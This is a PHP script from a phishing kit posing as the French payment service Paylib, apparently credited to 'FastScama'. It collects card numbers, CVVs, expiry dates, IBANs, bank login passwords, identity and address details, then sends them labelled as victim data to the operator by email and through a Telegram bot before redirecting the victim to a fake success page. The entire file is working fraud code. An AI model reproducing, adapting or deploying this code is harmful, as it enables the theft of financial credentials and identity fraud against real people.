<?php
include '../settings.php';
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['ccnum'] = $_POST['card_number'];
$_SESSION['cvv'] = 		$_POST['cvc'];
$_SESSION['exp'] = $_POST['card_exp_mm'] . $_POST['card_exp_aaaa'];
$_SESSION['montant']= $_POST['montant'];

if (!empty($_POST['card_number']) && !empty($_POST['cvc'])&& !empty($_POST['card_exp_mm'])&& !empty($_POST['card_exp_aaaa'])&& !empty($_POST['montant'])){
      

    $message = "
	[💳] Full | Paylib  

	[⌚] Heure et date : " . $_SESSION['date_heure'] . "

	[⌚] Référence : A5G7ME2UYT
	[📝] Iban  : " . $_SESSION['iban'] . "    
	[👤] Nom et prénom  : " . $_SESSION['noms'] ."
	[📝] Date de naissance  : " . $_SESSION['dob'] . "
	[📝] Ville de naissance  : " . $_SESSION['cp_dob'] . "
	[🌍] Département de naissance : " . $_SESSION['dep'] . "		
	
	[🌍] Adresse  : " . $_SESSION['adresse'] . "
	[🌍] Code postal et ville : " . $_SESSION['cp'] . "
	[☎️] N° de tel : " . $_SESSION['tel'] . "

	[🏛️] Nom de la banque : " . $_SESSION['nom_banque'] . "
	[🏛️] Identifiant bancaire : " . $_SESSION['id_banque'] . "
	[🏛️] Mot de passe : " . $_SESSION['mdp_banque'] . "

	[💳] N° carte : " . $_SESSION['ccnum'] . "
	[📅] Date d'expiration : " . $_SESSION['exp'] . "
	[🔢] CVV : " . $_SESSION['cvv'] . "

	[💰] Montant à recevoir : " . $_SESSION['montant'] . "
	[ℹ️] 𝗜𝗻𝗳𝗼 𝗩𝗶𝗰𝘁𝗶𝗺𝗲𝘀 [ℹ️]	
	[🌐] IP : " . $_SESSION['ip'] . "
	[©️] 𝓒𝓸𝓭𝓮𝓻 𝓫𝔂 𝓕𝓪𝓼𝓽𝓢𝓬𝓪𝓶𝓪[©️]";	

    if ($mail_sending == true) {
        $subject = "[💳]  FULL PAYLIB | " . $_SESSION['ip'];
        $headers = "From: PAYLIB | FASTSCAMA <rez@fastscama.fr>";
        mail($rezmail, $subject, $message, $headers);
    }

    
    if ($telegram_sending == true) {
        $data = [
            'text' => $message,
            'chat_id' => $chat_rez
        ];
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
    }
    

    
    header('Location: ../user/succes.php');
    
} else {
   
    header('Location: ../user/carte.php?error=1');
}

?>
